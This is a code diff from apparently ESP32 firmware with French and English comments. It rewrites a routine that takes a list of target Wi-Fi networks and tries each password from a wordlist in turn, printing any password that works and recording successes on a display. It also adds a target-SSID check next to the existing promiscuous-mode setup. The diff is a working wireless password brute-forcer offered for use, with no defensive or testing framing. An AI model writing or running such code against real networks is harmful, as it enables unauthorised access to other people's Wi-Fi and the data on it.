@@ -196,88 +196,70 @@ void initializePromiscuousMode() {
     Serial.println("Mode promiscuous activé.");
 }
 
+// Fonction pour vérifier si un SSID est dans la liste cible
+bool isSSIDTarget(const String& ssid) {
+    const char** foundSSIDs = getFoundSSIDs();
+    int foundSSIDCount = getFoundSSIDCount();
+
+    for (int i = 0; i < foundSSIDCount; i++) {
+        if (ssid == String(foundSSIDs[i])) {
+            return true; // SSID trouvé dans la liste cible
+        }
+    }
+    return false;
+}
+
+// Fonction pour extraire un mot de passe ou des données supplémentaires
+
 void testPasswords(const char* ssidList[], int ssidCount, const std::vector<String>& passwordList) {
     int passwordCount = passwordList.size();
-    bool ssidTested[ssidCount] = {false}; // Track tested SSIDs
-    unsigned long totalStartTime = millis(); // Start the total timer
+    bool ssidTested[ssidCount] = {false};
+    unsigned long totalStartTime = millis();
+    int totalPasswordsTested = 0;
 
-    for (int left = 0, right = passwordCount - 1; left <= right; left++, right--) {
-        bool allSSIDsTested = true;
+    // Test each SSID one at a time
+    for (int i = 0; i < ssidCount; ++i) {
+        const char* currentSSID = ssidList[i];
+        Serial.printf("\n=========================\n");
+        Serial.printf("Testing SSID %d/%d: %s\n", i + 1, ssidCount, currentSSID);
+        Serial.printf("=========================\n");
 
-        for (int i = 0; i < ssidCount; ++i) {
-            if (ssidTested[i]) continue; // Skip already tested SSIDs
-
-            const char* ssid = ssidList[i];
-            Serial.printf("-----------------\n");
-            Serial.printf("Testing SSID: %s\n", ssid);
-
-            // Test the left password
-            String password = passwordList[left];
-            Serial.printf("Testing Password: %s\n", password.c_str());
+        // Test all passwords for current SSID
+        for (int j = 0; j < passwordCount; ++j) {
+            String currentPassword = passwordList[j];
+            totalPasswordsTested++;
             
+            Serial.println(); // Add line break
+            Serial.printf("Password attempt %d/%d\n", j + 1, passwordCount);
+
             unsigned long startAttemptTime = millis();
-            WiFi.begin(ssid, password.c_str());
+            WiFi.begin(currentSSID, currentPassword.c_str());
+            
             while (WiFi.status() != WL_CONNECTED && millis() - startAttemptTime < 1000) {
-                vTaskDelay(10 / portTICK_PERIOD_MS);  // Non-blocking delay
+                vTaskDelay(10 / portTICK_PERIOD_MS);
             }
 
-            connectionResult = (WiFi.status() == WL_CONNECTED);
-            if (connectionResult) {
-                unsigned long connectionTime = (millis() - startAttemptTime) / 1000;
-                Serial.printf("Successfully connected to %s in %lu seconds\n", ssid, connectionTime);
-                updateConnectionScore(ssid, true, false); // Update the screen with the connection attempt
-                ssidTested[i] = true; // Mark SSID as tested
+            if (WiFi.status() == WL_CONNECTED) {
+                Serial.println("\n====================");
+                Serial.printf("SUCCESS! Connected to %s\n", currentSSID);
+                Serial.printf("Password found: %s\n", currentPassword.c_str());
+                Serial.printf("Attempt: %d/%d\n", j + 1, passwordCount);
+                Serial.println("====================\n");
+                updateConnectionScore(currentSSID, true, false);  // This function is now defined in tft_display.cpp
                 WiFi.disconnect(true);
-                continue;
-            } else {
-                Serial.printf("Failed to connect to %s\n", ssid);
-                updateConnectionScore(ssid, false, false); // Update the screen with the connection attempt
+                ssidTested[i] = true;
+                break;  // Move to next SSID once password is found
             }
+            
             WiFi.disconnect(true);
-            Serial.printf("-----------------\n");
-            
-            if (left == right) continue;
-
-            // Test the right password
-            password = passwordList[right];
-            
-            Serial.printf("Testing Password: %s\n", password.c_str());
-            
-            startAttemptTime = millis();
-            WiFi.begin(ssid, password.c_str());
-            while (WiFi.status() != WL_CONNECTED && millis() - startAttemptTime < 1000) {
-                vTaskDelay(10 / portTICK_PERIOD_MS);  // Non-blocking delay
-            }
-
-            connectionResult = (WiFi.status() == WL_CONNECTED);
-            if (connectionResult) {
-                unsigned long connectionTime = (millis() - startAttemptTime) / 1000;
-                Serial.printf("Successfully connected to %s in %lu seconds\n", ssid, connectionTime);
-                updateConnectionScore(ssid, true, false); // Update the screen with the connection attempt
-                ssidTested[i] = true; // Mark SSID as tested
-                WiFi.disconnect(true);
-            } else {
-                Serial.printf("Failed to connect to %s\n", ssid);
-                updateConnectionScore(ssid, false, false); // Update the screen with the connection attempt
-            }
-            WiFi.disconnect(true);
-            
         }
 
-        // Check if all SSIDs have been tested
-        for (int i = 0; i < ssidCount; ++i) {
-            if (!ssidTested[i]) {
-                allSSIDsTested = false;
-                break;
-            }
-        }
-
-        if (allSSIDsTested) {
-            Serial.println("All SSIDs have been tested.");
-            break;
+        if (!ssidTested[i]) {
+            Serial.printf("\nNo working password found for %s\n", currentSSID);
         }
     }
 
-    unsigned long totalTime = (millis() - totalStartTime) / 1000;
-    Serial.printf("Total time taken for testing all SSIDs: %lu seconds\n", totalTime);
+    Serial.println("\n====================");
+    Serial.printf("Testing completed in %lu seconds\n", (millis() - totalStartTime) / 1000);
+    Serial.println("====================");
 }
